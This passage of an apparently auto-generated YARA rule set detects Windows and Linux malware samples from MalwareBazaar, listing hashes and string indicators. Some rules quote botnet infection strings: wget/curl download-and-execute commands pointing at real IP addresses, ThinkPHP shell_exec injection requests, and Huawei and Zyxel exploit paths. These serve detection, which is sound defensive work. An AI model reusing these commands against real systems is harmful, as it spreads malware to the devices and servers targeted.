        $s3 = "Google\\Chrome\\Application\\chrome.exeBraveSoftware\\Brave-Browser\\Application\\brave.exe\\Microsoft\\Edge\\Application\\msedge.exe"
        $s4 = "taskkill.exe/PID/F"
        $s5 = "library\\std\\src\\sys\\windows\\args.rscmd.exe /c \"Windows file names may not contain `\"` or end with `\\`"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3072KB
        and all of them
}

rule Windows_94587b41a0eb5e2c592976fa283b0bfc0ef2e2c5cec24bba298cda0eb67270de{
    meta:
        description = "Auto ML: 94587b41a0eb5e2c592976fa283b0bfc0ef2e2c5cec24bba298cda0eb67270de"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "msi.dll"
        $s2 = "gdiplus.dll"
        $s3 = "Cabinet.dll"
        $s4 = "USER32.dll"
        $s5 = "GDI32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 7092KB
        and all of them
}

rule Windows_94627d8117da7cccd8c34a1d8ad88d988a26ec6337d0d66559ee6943f2c2a233{
    meta:
        description = "Auto ML: 94627d8117da7cccd8c34a1d8ad88d988a26ec6337d0d66559ee6943f2c2a233"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "advapi32.dll"
        $s2 = "setupx.dll"
        $s3 = "setupapi.dll"
        $s4 = ".BAT"
        $s5 = "advpack.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2419KB
        and all of them
}

rule Linux_9478bb8fa96a4b9baa199be60285800027abb1fd296ca8e0a0fd26ee647c49ff{
    meta:
        description = "Auto ML: 9478bb8fa96a4b9baa199be60285800027abb1fd296ca8e0a0fd26ee647c49ff"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = " HTTP/1.1"
        $s2 = "/tftp"
        $s3 = "/bin/bash -c \"/bin/wget http://82.165.215.205/bins/bins.sh; chmod +x bins.sh; sh bins.sh; /bin/curl -k -L --output bins.sh http://82.165.215.205/bins/bins.sh; chmod +x bins.sh; sh bins.sh\""
        $s4 = ".shstrtab"
        $s5 = "/proc/%d/cwd"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 65KB
        and all of them
}

rule Windows_94a65cca7423e32a923dcc0aad65712c9048d5c79d51162237ebd24a8d99f961{
    meta:
        description = "Auto ML: 94a65cca7423e32a923dcc0aad65712c9048d5c79d51162237ebd24a8d99f961"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "ssNT.exe"
        $s2 = "mscoree.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 625KB
        and all of them
}

rule Windows_94b238a6c0c1757059b32035d7f7908b93a03c95cbcfb5c410380093a4ae3e00{
    meta:
        description = "Auto ML: 94b238a6c0c1757059b32035d7f7908b93a03c95cbcfb5c410380093a4ae3e00"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "gnokmFtpyRGQFGg4Mgy"
        $s2 = "Px68TKcI6IrOftp9KGy"
        $s3 = "user32.dll"
        $s4 = "kernel32.dll"
        $s5 = "gdi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2109KB
        and all of them
}

rule Linux_94d6fc681bec3ea98634f2a830912ccfc827182fb7d0a4398a0c5c1fe7bf6ae9{
    meta:
        description = "Auto ML: 94d6fc681bec3ea98634f2a830912ccfc827182fb7d0a4398a0c5c1fe7bf6ae9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "HTTP/1.1 404 Not Found"
        $s3 = "HTTP/1.1 200 OK"
        $s4 = "skyljne.sh4"
        $s5 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 167KB
        and all of them
}

rule Windows_94df05071cad9595820a5132137d060b0d2d3cd122e5cad35a014d80a6bde02a{
    meta:
        description = "Auto ML: 94df05071cad9595820a5132137d060b0d2d3cd122e5cad35a014d80a6bde02a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "httP"
        $s2 = "288c47bbc187111b439df19ff4df68f076.exe"
        $s3 = "kernel32.dll"
        $s4 = "mscoree.dll"
        $s5 = ".shsgkqqeodmshsfkqqeodmshsfkqqeodmshsfkqqeodmshs"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6617KB
        and all of them
}

rule Windows_94fca89e71f396bf1fd8f97ab027d6f64d443f6e3b8bc6ff259604401f78416b{
    meta:
        description = "Auto ML: 94fca89e71f396bf1fd8f97ab027d6f64d443f6e3b8bc6ff259604401f78416b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Whirtles.exe"
        $s2 = "XRails_LeftPanel"
        $s3 = "rstrtmgr.dll"
        $s4 = "ftps"
        $s5 = "dwmapi.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 215KB
        and all of them
}

rule Windows_95015476fa2591987bbb360f77ed7211ba263044bd74b4f33ffbc3281f639b86{
    meta:
        description = "Auto ML: 95015476fa2591987bbb360f77ed7211ba263044bd74b4f33ffbc3281f639b86"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "user32.dll"
        $s2 = "OLEAUT32.dll"
        $s3 = "USER32.dll"
        $s4 = "SHELL32.dll"
        $s5 = "KERNEL32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 7453KB
        and all of them
}

rule Windows_95102aff67d60250cdfb95d2ec0a57a5872397ff350384ef3535ceabe7b5d27e{
    meta:
        description = "Auto ML: 95102aff67d60250cdfb95d2ec0a57a5872397ff350384ef3535ceabe7b5d27e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "kernel32.dll"
        $s2 = "shell32.dll"
        $s3 = "user32.dll"
        $s4 = "oleaut32.dll"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00505a4d and
        filesize < 6289KB
        and all of them
}

rule Windows_0f6fa3e9b6832c5d01c2c20fec6d8e791b6fd6af008cc63edb1014c2cb281647{
    meta:
        description = "Auto ML: 0f6fa3e9b6832c5d01c2c20fec6d8e791b6fd6af008cc63edb1014c2cb281647"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "kernel32.dll"
        $s2 = "shell32.dll"
        $s3 = "user32.dll"
        $s4 = "oleaut32.dll"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00505a4d and
        filesize < 6885KB
        and all of them
}

rule Windows_9581ec377f2622120a2ad56ef162c292c8fc5775cbc42ed3e8dbf565efca0d31{
    meta:
        description = "Auto ML: 9581ec377f2622120a2ad56ef162c292c8fc5775cbc42ed3e8dbf565efca0d31"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "kernel32.dll"
        $s2 = "shell32.dll"
        $s3 = "user32.dll"
        $s4 = "oleaut32.dll"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4470KB
        and all of them
}

rule Windows_958e0b273ab024241617d2815b92ea517a0febd994e554fbf65fe62ea829b279{
    meta:
        description = "Auto ML: 958e0b273ab024241617d2815b92ea517a0febd994e554fbf65fe62ea829b279"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "TArray<System.ShortInt>"
        $s2 = "System.SysUtils"
        $s3 = "/TArray<System.SysUtils.TMarshaller.TDisposeRec>"
        $s4 = "System.SysUtilsL"
        $s5 = "&TArray<System.SysUtils.TUnitHashEntry>"

    condition:
        uint32(0) == 0x00505a4d and
        filesize < 3162KB
        and all of them
}

rule Windows_9594160451608088b8e987328f0b13fb77d59bc99d27c4faad97e2ad834c5a65{
    meta:
        description = "Auto ML: 9594160451608088b8e987328f0b13fb77d59bc99d27c4faad97e2ad834c5a65"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "u.ShTgB"
        $s2 = "Could not find \"setup.exe\"."
        $s3 = " \"setup.exe\" "
        $s4 = "ntdll.dll"
        $s5 = "c:\\windows\\system32\\ntdll.dll"

    condition:
        uint32(0) == 0x00605a4d and
        filesize < 858KB
        and all of them
}

rule Windows_95975615eb1d0194e9ed527770f247e241194a3ad66ae2294a8939a216ae3ad2{
    meta:
        description = "Auto ML: 95975615eb1d0194e9ed527770f247e241194a3ad66ae2294a8939a216ae3ad2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "-444GV]QPXX4UGC\\[[_4GZL\\_4444j"

    condition:
        uint32(0) == 0x00805a4d and
        filesize < 37KB
        and all of them
}

rule Windows_95e15b50e1e8de17a0537512e7d84d479ab888ab75c314f73bda0ca764923861{
    meta:
        description = "Auto ML: 95e15b50e1e8de17a0537512e7d84d479ab888ab75c314f73bda0ca764923861"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "installation_intelligence_with_autoselection.exe"
        $s2 = "iE2d8Ftp1WbiFgM7AIx"
        $s3 = "MicrosoftPublicKey"
        $s4 = "MicrosoftPublicKeyToken"
        $s5 = "MicrosoftPublicKeyFull"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5675KB
        and all of them
}

rule Linux_95fcdb6e14ad59ce6ba178e7430aeea5b88ad06e41013681c7524bb430f9cc48{
    meta:
        description = "Auto ML: 95fcdb6e14ad59ce6ba178e7430aeea5b88ad06e41013681c7524bb430f9cc48"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/proc/self/exe"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 35KB
        and all of them
}

rule Windows_960c58c5c9c3b495ca27e3e98f19c28a79ce1b6d1c998f1186bca090a7618df7{
    meta:
        description = "Auto ML: 960c58c5c9c3b495ca27e3e98f19c28a79ce1b6d1c998f1186bca090a7618df7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Remote.exe"
        $s2 = "kernel32.dll"
        $s3 = "mscoree.dll"
        $s4 = "clrjit.dll"
        $s5 = "32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 504KB
        and all of them
}

rule Windows_96145fa7973c4ff3a51dc56f8c52ec7b8265f70c84042907331b56328df778f6{
    meta:
        description = "Auto ML: 96145fa7973c4ff3a51dc56f8c52ec7b8265f70c84042907331b56328df778f6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "libgcc_s_seh-1.dll"
        $s2 = "KERNEL32.dll"
        $s3 = "msvcrt.dll"
        $s4 = "libstdc++-6.dll"
        $s5 = "C:/M/B/src/mingw-w64/mingw-w64-crt/crt/crtexe.c"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 139KB
        and all of them
}

rule Windows_961a589be9f24446f3b01ea426bc975ab09c158c9ff0888cdef81fcdb596d818{
    meta:
        description = "Auto ML: 961a589be9f24446f3b01ea426bc975ab09c158c9ff0888cdef81fcdb596d818"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "%s%c%s.exe"
        $s2 = "ucrtbase.dll"
        $s3 = "Path of ucrtbase.dll (%s) length exceeds buffer[%d] space"
        $s4 = "USER32.dll"
        $s5 = "KERNEL32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 7166KB
        and all of them
}

rule Windows_961d929428efdaa00180f64acc9a601ab764b8ee4cc16753bf349a69b0d081bf{
    meta:
        description = "Auto ML: 961d929428efdaa00180f64acc9a601ab764b8ee4cc16753bf349a69b0d081bf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "USER32.DLL"
        $s2 = "msimg32.dll"
        $s3 = "KERNEL32.dll"
        $s4 = "GDI32.dll"
        $s5 = "SHELL32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 313KB
        and all of them
}

rule Linux_0f709f8e918c2796fdc46c078c526551c44309c1de16d215bd499a14a565c809{
    meta:
        description = "Auto ML: 0f709f8e918c2796fdc46c078c526551c44309c1de16d215bd499a14a565c809"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".shstrtab"
        $s2 = "/proc/self/exe"
        $s3 = "/proc/net/tcp"
        $s4 = "/bin/sh"
        $s5 = "/dev/null"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 152KB
        and all of them
}

rule Windows_961db0c18fc8e1e0c1b7f8f0da3db4a1ecc2533d0a6159c1de01640db7925315{
    meta:
        description = "Auto ML: 961db0c18fc8e1e0c1b7f8f0da3db4a1ecc2533d0a6159c1de01640db7925315"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "kernel32.dll"
        $s2 = "shell32.dll"
        $s3 = "user32.dll"
        $s4 = "oleaut32.dll"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4469KB
        and all of them
}

rule Windows_964aa781e5758bb5640773c844220b9771f66e6482d7d63749def2f1abcaf08b{
    meta:
        description = "Auto ML: 964aa781e5758bb5640773c844220b9771f66e6482d7d63749def2f1abcaf08b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Spgfe.exe"
        $s2 = "http://38.255.43.23/sure.dat"
        $s3 = "System.Net"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 17KB
        and all of them
}

rule Windows_968cafa7d216f33478546a89a8d5c4754351e7f537bc50910f7f9c25d152e764{
    meta:
        description = "Auto ML: 968cafa7d216f33478546a89a8d5c4754351e7f537bc50910f7f9c25d152e764"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "-.sh"
        $s2 = "IME~WMAPI.DLL"
        $s3 = "i.exe"
        $s4 = "\"FTp"
        $s5 = "      <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true/pm</dpiAware>"

    condition:
        uint32(0) == 0x00505a4d and
        filesize < 1656KB
        and all of them
}

rule Windows_96a244b32e73bac08510839a1137c41941ff4b18b1171c9fde09d0603b2477a7{
    meta:
        description = "Auto ML: 96a244b32e73bac08510839a1137c41941ff4b18b1171c9fde09d0603b2477a7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PGma.System.MouseKeyHook, Version=5.6.130.0, Culture=neutral, PublicKeyToken=null"
        $s2 = "Http_1_1"
        $s3 = "<HttpRealm>k__BackingField"
        $s4 = "HttpWebResponse"
        $s5 = "MicrosoftPrevCACertHash"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3190KB
        and all of them
}

rule Windows_972a96f02c44e04dfd1e329aefb50194456f051c7c37c8a507be18869e4c026b{
    meta:
        description = "Auto ML: 972a96f02c44e04dfd1e329aefb50194456f051c7c37c8a507be18869e4c026b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "FTPjK"
        $s2 = "FtPj;"
        $s3 = "ADVAPI32.DLL"
        $s4 = "USER32.DLL"
        $s5 = "KERNEL32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 290KB
        and all of them
}

rule Windows_9744b215300c01b5e7f18199287b2b898bb1a8a7d3b01f9acea6eb6069c62f1f{
    meta:
        description = "Auto ML: 9744b215300c01b5e7f18199287b2b898bb1a8a7d3b01f9acea6eb6069c62f1f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "FTPjK"
        $s2 = "FtPj;"
        $s3 = "ADVAPI32.DLL"
        $s4 = "USER32.DLL"
        $s5 = "KERNEL32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 291KB
        and all of them
}

rule Windows_974b705980668b3d9fd809501c581d7961db4a43304826edf136764c789a28b1{
    meta:
        description = "Auto ML: 974b705980668b3d9fd809501c581d7961db4a43304826edf136764c789a28b1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Santaa.exe"
        $s2 = "MuXfikfoTuZfpiruETMXUJFaHlsOWBdMhzNnEqTLMAvqvftpZPNGRXeCoxXxrRRSRMyqVEqNAALU"
        $s3 = "XeEFVCbPlHNKPqviBGbznZPAFKkWTaTYkwGADJvwgyxMJfOJxnLqNlLyODzLRFvKopZSjvfsKfTpbDrawbZgPcKyl"
        $s4 = "XLkSZuKaDQUxgosfTPlbaGSQOTEwoPUozCKgFMwWCamtIbBpecGiHNxQtTEFpNmnwfxddMZHTPYATYHmRORMIlglFumlIqgpny"
        $s5 = "ILGVCvovYsmucdcLmZprzMJWrXCZWPnfSRFPvtzlWVoSRqrBwtkucoowCjeftPZIEGbKYNQtZEVeXqEAgAccfsDedINLOUrGwf"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 349KB
        and all of them
}

rule Windows_975c4ebf786941650ee40d182564b157ea7656befa2a343cccff3c4952fedbda{
    meta:
        description = "Auto ML: 975c4ebf786941650ee40d182564b157ea7656befa2a343cccff3c4952fedbda"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "kernel32.dll"
        $s2 = "shell32.dll"
        $s3 = "user32.dll"
        $s4 = "oleaut32.dll"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4606KB
        and all of them
}

rule Linux_97aa06c4caa77bd486f4a6a4aa59194de536ff9787cb6f845d1135eb289a20eb{
    meta:
        description = "Auto ML: 97aa06c4caa77bd486f4a6a4aa59194de536ff9787cb6f845d1135eb289a20eb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://141.98.10.85/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1"
        $s3 = "POST /cgi-bin/ViewLog.asp HTTP/1.1"
        $s4 = " /bin/busybox wget http://141.98.10.85/zyxel.sh; chmod +x zyxel.sh; ./zyxel.sh"
        $s5 = ".shstrtab"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 100KB
        and all of them
}

rule Windows_97c2d5b8641875634156368989ff410bb6b5cab67c2c5430b73cb47d51982012{
    meta:
        description = "Auto ML: 97c2d5b8641875634156368989ff410bb6b5cab67c2c5430b73cb47d51982012"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "mVnV2llftP)njM-4MDc"
        $s2 = "CinemaHallSimulation.exe"
        $s3 = "kernel32.dll"
        $s4 = "-FTP"
        $s5 = "    <EntitySet Name=\"Showtimes\" EntityType=\"CinemaDbModel.Showtimes\" />"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1420KB
        and all of them
}

rule Windows_0f73dc9673062de7bb486da601791e67e78e9aaae6a1dc5fabbdf5abe5fcc058{
    meta:
        description = "Auto ML: 0f73dc9673062de7bb486da601791e67e78e9aaae6a1dc5fabbdf5abe5fcc058"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "USER32.DLL"
        $s2 = "KERNEL32.dll"
        $s3 = "GDI32.dll"
        $s4 = "ADVAPI32.dll"
        $s5 = "SHELL32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 179KB
        and all of them
}

rule Windows_97ee222794b0e20266259caf3ff1e198f56c4cf87af316452a9bd2f8f9982a6b{
    meta:
        description = "Auto ML: 97ee222794b0e20266259caf3ff1e198f56c4cf87af316452a9bd2f8f9982a6b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".dllu"
        $s2 = "http/1.1M9/"
        $s3 = "http/1.1"
        $s4 = ">httpu"
        $s5 = ">http"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 17619KB
        and all of them
}

rule Windows_97f65a11f372b7cfdace34c1aac4b114f3d04bbc73b4c1dc3be743d506532b5d{
    meta:
        description = "Auto ML: 97f65a11f372b7cfdace34c1aac4b114f3d04bbc73b4c1dc3be743d506532b5d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = " \"setup.exe\" "
        $s2 = "Could not find \"setup.exe\"."
        $s3 = "COMCTL32.dll"
        $s4 = "SHELL32.dll"
        $s5 = "GDI32.dll"

    condition:
        uint32(0) == 0x00605a4d and
        filesize < 3024KB
        and all of them
}

rule Linux_98275127b4568f7b96e1d56112f4e4e216cccc04d11c05e7a7aef462dafb517a{
    meta:
        description = "Auto ML: 98275127b4568f7b96e1d56112f4e4e216cccc04d11c05e7a7aef462dafb517a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = ".shstrtab"
        $s3 = "/compress/usr/"
        $s4 = "/proc/self/exe"
        $s5 = "/dev/null"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 48KB
        and all of them
}

rule Windows_986ac471d320e58d3398bb0ca041f53286265a3d3719543d07c32b27025b85ce{
    meta:
        description = "Auto ML: 986ac471d320e58d3398bb0ca041f53286265a3d3719543d07c32b27025b85ce"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "kernel32.dll"
        $s2 = "shell32.dll"
        $s3 = "user32.dll"
        $s4 = "oleaut32.dll"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4605KB
        and all of them
}

rule Windows_98c5b27797be37eee59bbd120c39463aa64f8f59d26dbe3c46fae389d4fe41a9{
    meta:
        description = "Auto ML: 98c5b27797be37eee59bbd120c39463aa64f8f59d26dbe3c46fae389d4fe41a9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "KERNEL32.dll"
        $s2 = "C:\\\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\AppLaunch.exe"
        $s3 = "api-ms-win-core-synch-l1-2-0.dll"
        $s4 = "kernel32.dll"
        $s5 = "mscoree.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 603KB
        and all of them
}

rule Linux_9902df7149b19f56fdf08e56e299835da52093b292066b0eed0dcc4847d10eb4{
    meta:
        description = "Auto ML: 9902df7149b19f56fdf08e56e299835da52093b292066b0eed0dcc4847d10eb4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "N^NuPOST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://2.58.113.120/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1"
        $s3 = "POST /cgi-bin/ViewLog.asp HTTP/1.1"
        $s4 = " /bin/busybox wget http://2.58.113.120/zyxel.sh; chmod +x zyxel.sh; ./zyxel.sh"
        $s5 = ".shstrtab"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 77KB
        and all of them
}

rule Linux_99119e4a6302bad65f77ccebea703adc800906e19efce05dcb87c96eb4146b0d{
    meta:
        description = "Auto ML: 99119e4a6302bad65f77ccebea703adc800906e19efce05dcb87c96eb4146b0d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".shst"
        $s2 = "/proc/self/exe"
        $s3 = "/self/ex"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 40KB
        and all of them
}

rule Windows_992a18c1acf77c16753e3427ad1b034bb492db056afc0849577559fba16069ed{
    meta:
        description = "Auto ML: 992a18c1acf77c16753e3427ad1b034bb492db056afc0849577559fba16069ed"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "FTPjK"
        $s2 = "FtPj;"
        $s3 = "ADVAPI32.DLL"
        $s4 = "USER32.DLL"
        $s5 = "KERNEL32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 290KB
        and all of them
}

rule Windows_9932a993d99136f37df22dd144438e8dfe94bc17b0de0b4da258c64cc401e229{
    meta:
        description = "Auto ML: 9932a993d99136f37df22dd144438e8dfe94bc17b0de0b4da258c64cc401e229"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "USER32.dll"
        $s2 = "GDI32.dll"
        $s3 = "COMDLG32.dll"
        $s4 = "ADVAPI32.dll"
        $s5 = "SHELL32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1060KB
        and all of them
}

rule Windows_996bd2fdc641a08e3b893338d3e6d697ce57902ce50f6e51779fdaa53ce2de8d{
    meta:
        description = "Auto ML: 996bd2fdc641a08e3b893338d3e6d697ce57902ce50f6e51779fdaa53ce2de8d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".dllu"
        $s2 = ">.exeu"
        $s3 = "go.shape"
        $s4 = "*go.shape.bool"
        $s5 = "*runtime.sysmontick"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3465KB
        and all of them
}

rule Windows_0faa7c27d8cedbb19af0586a236ce4eca6b151509e526bedcc970606e391ce74{
    meta:
        description = "Auto ML: 0faa7c27d8cedbb19af0586a236ce4eca6b151509e526bedcc970606e391ce74"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "FTPjK"
        $s2 = "FtPj;"
        $s3 = "ADVAPI32.DLL"
        $s4 = "USER32.DLL"
        $s5 = "KERNEL32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 312KB
        and all of them
}

rule Windows_9972ff74fd86bc011a83334ddcbd97a3123c6a0f723e2999c6c6bdde9dfef141{
    meta:
        description = "Auto ML: 9972ff74fd86bc011a83334ddcbd97a3123c6a0f723e2999c6c6bdde9dfef141"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "ClamAV - A GPL virus scanner - http://www.clamav.net"
        $s2 = "kernel32.dll"
        $s3 = "wininet.dll"
        $s4 = "ole32.dll"
        $s5 = "Wininet.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1196KB
        and all of them
}

rule Linux_99804ad418ef95e82d94a81fb390ff0f37378b9af1a6d9d91da857ee1c00394b{
    meta:
        description = "Auto ML: 99804ad418ef95e82d94a81fb390ff0f37378b9af1a6d9d91da857ee1c00394b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = ".shstrtab"
        $s3 = "/proc/%d"
        $s4 = "/proc/self"
        $s5 = "/proc/%d/exe"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 59KB
